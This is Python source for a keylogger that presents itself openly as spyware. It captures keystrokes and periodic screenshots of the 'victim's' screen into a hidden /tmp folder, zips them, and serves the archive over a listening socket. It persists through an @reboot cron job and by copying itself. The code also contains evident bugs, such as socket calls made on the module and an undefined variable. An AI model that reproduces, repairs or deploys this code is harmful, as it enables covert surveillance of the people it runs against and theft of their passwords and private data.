#!/usr/bin/env python3

'''
-----------------------------------------------------------------------------
THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!
Name : 		  Alexis Rodriguez
Date : 		  2020-02-09
Description : this program captures all keystrokes pressed on a keyboard,
			  takes a screenshot of the victims screen, and binds a server 
			  socket to transfer a zip file of all the gathered data over
			  a socket connection. The keyself.logger text file is updated every
			  20 seconds and the screen capture occurs every 2 minutes. As of
			  right now this program will only work on Linux machines
			  but will be updated in the near future for Windows machine too.
			  
			  ___   _      ___   _      ___   _      ___   _      ___   _
			 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
			  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
			 /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /
			       |____________|____________|____________|____________|
			                             |            |            |
			                         ___  \\_      ___  \\_      ___  \\_
			                        [(_)] |=|    [(_)] |=|    [(_)] |=|
			                         '-`  |_|     '-`  |_|     '-`  |_|
			                        /mmm/        /mmm/        /mmm/
					                  !
'''

from pynput import keyboard
from zipfile import ZipFile
import pyautogui as pygrab
import threading
import socket as sck
import os, time
import subprocess as subp


'''************************************************************'''
''' 					   CLASS DEFINITION                    '''
'''************************************************************'''
class Keylogger:
	# invoking the constructor will declare class variable self.log
	def __init__(self):
		self.log = ''

	'''
	Begin capturing keystrokes
	'''
	def start_listening(self):
		with keyboard.Listener(
			on_press=self.on_press) as listener:
			listener.join()

	'''
	make directory in /tmp folder
	'''
	def make_get_dir(self):
		# try making directory
		try:
			dir_to_create = '/tmp/.folder/'
			os.mkdir(dir_to_create)
		# if it already exists do nothing
		except OSError:
			pass
		# return the name of the directory created
		return dir_to_create

	'''
	Handles the action taken when a 
	key is pressed.
	'''
	def on_press(self, key):
		# try casting key as string
		try:
			self.log += str(key.char)
		# handling special characters
		except AttributeError:
			# if person presses space
			if key == key.space:
				self.log += ' '
				# if person presses enter
			elif key == key.enter: self.log += '\n'
			# if person presses backspace
			elif key == key.backspace: self.log += ''
			# if person presses control key
			elif key == key.ctrl: self.log += ' ctrl+'
			else:
				self.log += str(key)

	'''
	Logging to a file every 20 seconds
	'''
	def log_to_file(self):
		# open file
		f = open(self.make_get_dir() + 'log.txt', 'w')
		# write self.log to file
		f.write(self.log)
		# every 20 seconds invoke this function
		clock = threading.Timer(20, self.log_to_file())
		# begin clock
		clock.start()

	'''
	get time image was taken append it to 
	the name of the images file
	'''
	def make_name(self):
		# seconds since the creation of python
		seconds_since_epoch = time.time()
		# return full date into a list
		date = time.ctime(seconds_since_epoch).split()
		# return the desired parts of the date list
		return date[1] + '-' + date[2] + '-' + date[3]

	'''
	Take a screenshot of the victions computer
	every minute and save it to /tmp/.folder directory
	'''
	def save_screen(self):
		# take a screenshot
		image = pygrab.screenshot()
		# get time to append to image file name
		time = self.make_name()
		# save image to the directory that was created
		image.save(r'/tmp/.folder/normal_'+time+'.png')
		# repeat function every two minutes
		take_screen = threading.Timer(120, save_screen)
		# begin timer
		take_screen.start()

	'''
	Zip folder contents before sending as email
	Param : directory of folder location
	'''
	def zip_folder(self, direc):
		# list to contain all path of files to zip
		file_paths = []
		zip_name = 'zipped_file.zip'

		for root, directories, files in os.walk(direc):
			for file in files:
				# joining absolute path with file name
				filepath = os.path.join(root, file)
				# append filepath to list containing all file paths
				file_paths.append(filepath)

		# creating zipped file
		with ZipFile('/tmp/.folder/'+zip_name, 'w') as zipped:
			# for every file in list of file paths,
			# add file to zip file
			for file in file_paths:
				zipped.write(file)

			return zipped

	'''
	send the zipped folder to the attacker
	Param : zipped file created by zip_folder function
	'''
	def socket_listen_send(self):
		# get name of directory that was made
		directory = self.make_get_dir()
		# get zipped file composed of folders contents
		zipped_file = self.zip_folder(directory)
		# creating socket context manager
		with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as soc:
			# get IP address of victim and assign listening port
			IP=sck.gethostbyname(sck.gethostname())
			PORT=1945 # the end of ww2

			# bind socket to victim IP address and port
			sck.bind((IP, PORT))
			# listen for incoming connections
			sck.listen(5)
			# accept and receive connection
			connection, address = sck.accept()
			# open file to read as bytes
			with open(zipped_file, 'rb') as zip_file:
					# read bytes from file
					content = zip_file.read()
					# send bytes data over socket
					connection.send(content)
					# closing file to end loop
					zip_file.close()


	'''
	Create cronjob to startup keyself.logger after reboot
	'''
	def create_cronjob(self):
		# echo cronjob command into file
		subp.call(['echo', '@reboot', '/tmp/.folder/run.py', '>', 'my-crontab'])
		# update crontab with the command in my conjob file
		subp.call(['crontab', 'my-crontab'])

	'''
	replicate keyself.logger in /tmp/folder to
	continue to turn on keyself.logger after reboot
	'''
	def replicate(self, direc, initial_direc):
		# create file run.py in location of collected data
		subp.call(['touch', direc + 'run.py'])
		# copy contents of keyself.log file over to /tmp
		# to make sure cronjob finds python file to interpret
		subp.call(['cp', initial_file_path + 'run.py', direc + 'run.py'])


'''
*************
MAIN IS HERE!
*************
'''
def initiate():
	# instantiating object
	my_obj = Keylogger()
	# makd directory
	my_obj.make_get_dir()
	# invoke this function to begin listening
	my_obj.start_listening()
	# begin logging to keylog file
	my_obj.log_to_file()
	# begin taking screenshots
	my_obj.save_screen()
	# listen for socket connections and send at zipped file
	my_obj.socket_listen_send()
	# create cronjob to start keylogger after reboot
	my_obj.create_cronjob()
	# get path of where the initial file was downloaded
	initial_file_path = os.getcwd()
	# get /tmp folder name
	directory = my_obj.make_get_dir()
	# replicate the initial file into the /tmp/.folder
	# to continue to execute keylogger after reboot
	my_obj.replicate(directory, initial_file_path)



if __name__ == '__main__':
	print('''
			PYTHON KEYLOGGER 2020
. -------------------------------------------------------------------.        
| [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
|                                                                    |        
| [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
| [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
| [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
| [^][\\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
| [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
`--------------------------------------------------------------------'        
	''')

	initiate()